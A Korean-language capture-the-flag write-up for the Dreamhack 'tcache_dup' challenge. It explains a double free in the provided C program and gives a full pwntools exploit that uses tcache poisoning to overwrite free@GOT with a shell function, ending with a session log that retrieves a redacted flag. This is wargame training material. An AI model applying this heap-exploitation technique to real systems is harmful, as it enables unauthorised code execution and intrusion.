# ✏️ tcache_dup
> https://dreamhack.io/wargame/challenges/60

## 📄 Vulnerability & Code Analysis
주어진 소스 코드는 다음과 같다.
```c
// gcc -o tcache_dup tcache_dup.c -no-pie
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

char *ptr[10];

void alarm_handler() {
    exit(-1);
}

void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    signal(SIGALRM, alarm_handler);
    alarm(60);
}

int create(int cnt) {
    int size;

    if (cnt > 10) {
        return -1;
    }
    printf("Size: ");
    scanf("%d", &size);

    ptr[cnt] = malloc(size);

    if (!ptr[cnt]) {
        return -1;
    }

    printf("Data: ");
    read(0, ptr[cnt], size);
}

int delete() {
    int idx;

    printf("idx: ");
    scanf("%d", &idx);

    if (idx > 10) {
        return -1;
    }

    free(ptr[idx]);
}

void get_shell() {
    system("/bin/sh");
}

int main() {
    int idx;
    int cnt = 0;

    initialize();

    while (1) {
        printf("1. Create\n");
        printf("2. Delete\n");
        printf("> ");
        scanf("%d", &idx);

        switch (idx) {
            case 1:
                create(cnt);
                cnt++;
                break;
            case 2:
                delete();
                break;
            default:
                break;
        }
    }

    return 0;
}
``` 
`delete()`는 `free(ptr[idx])`만 호출하고 `ptr[idx]`를 NULL로 초기화하지 않는다. 그래서 같은 idx로 `delete()`를 두 번 연속 호출하면 이미 해제된 청크가 다시 free되는 **Double Free**가 발생하고, 이후에도 stale pointer로 청크에 접근할 수 있는 **Use-After-Free** 조건이 그대로 남는다.

바이너리는 Partial RELRO + No PIE 조합이라 `free@GOT`가 쓰기 가능하고, 바이너리 내부 주소(`get_shell` 함수 포함)는 리크 없이 고정 오프셋으로 바로 계산 가능하다.

## 🗡️ Exploit / Solver Strategy

1. 청크 A 하나를 할당한다.
2. A를 두 번 연속 `free()`하여 tcache 리스트를 `A → A` 순환 구조로 만든다 (double free).
3. `malloc`으로 A를 다시 받아 그 안의 `next` 필드를 `free@GOT` 주소로 덮어쓴다 (tcache poisoning).
4. `malloc`을 한 번 더 호출해 tcache head를 `free@GOT`로 진행시킨다 (이때 채우는 데이터는 아무 값이나 무방).
5. `malloc`을 한 번 더 호출하면 `free@GOT` 주소 자체가 반환되고, 여기에 `get_shell` 주소를 써서 GOT를 덮어쓴다.
6. 이후 아무 `free()`나 호출하면 `free@GOT`를 통해 실제로는 `get_shell()`이 실행되어 셸을 얻는다.

libc leak이나 `system("/bin/sh")` 계산이 필요 없는, 리크 없이 GOT 하이재킹만으로 끝나는 단순한 구조다.

**환경 이슈 기록**: 로컬에서 `process('./tcache_dup')`만으로 실행하면 double free 직후 두 번째 `free()`에서 `SIGABRT`가 발생했다. 원인은 문제 폴더에 제공된 `libc-2.27.so`가 아니라 시스템 기본 libc가 로더에 의해 자동으로 붙었기 때문이며, 두 libc 간 tcache double free 검사 로직 차이로 크래시가 난 것이었다. `process(..., env={'LD_PRELOAD': './libc-2.27.so'})`로 문제 제공 libc를 강제 지정하니 로컬에서도 정상 동작했다. 원격 서버는 Docker 이미지 자체에 해당 libc가 표준 경로로 구성되어 있어 별도 조치 없이 바로 성공했다.

## 💻 Final Payload or Solver
```python
from pwn import *
p = remote('host3.dreamhack.games', 13375)
e = ELF('./tcache_dup')
libc = ELF('./libc-2.27.so')

def create(size, data):
    p.sendlineafter(b'> ', b'1')      
    p.sendlineafter(b'Size: ', str(size).encode())  
    p.sendafter(b'Data: ', data)      

def delete(idx):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'idx: ', str(idx).encode())

get_shell = e.symbols['get_shell']
free = e.got['free']

create(0x80, b'A'*8)
delete(0)
delete(0)  # double free

create(0x80, p64(free))  # overwrite free@got with get_shell
create(0x80, b'B'*8)  # allocate chunk to get free
create(0x80, p64(get_shell))  # overwrite free@got with get
delete(0)  # call get_shell

p.interactive()
```
## 🏳️ cat flag
```bash
(.venv) (base) ➜  tcache_dup pypwn tcache_dup.py
[.] Opening connection to host3.dreamhack.games on port 13375: Trying 23[+] Opening connection to host3.dreamhack.games on port 13375: Done
[*] '/home/daniel/dreamhack/pwn/tcache_dup/tcache_dup'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
[*] '/home/daniel/dreamhack/pwn/tcache_dup/libc-2.27.so'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
[*] Switching to interactive mode
$ cat flag
DH{<FLAG_REDACTED>}
[*] Got EOF while reading in interactive
$
[*] Interrupted
[*] Closed connection to host3.dreamhack.games port 13375
```
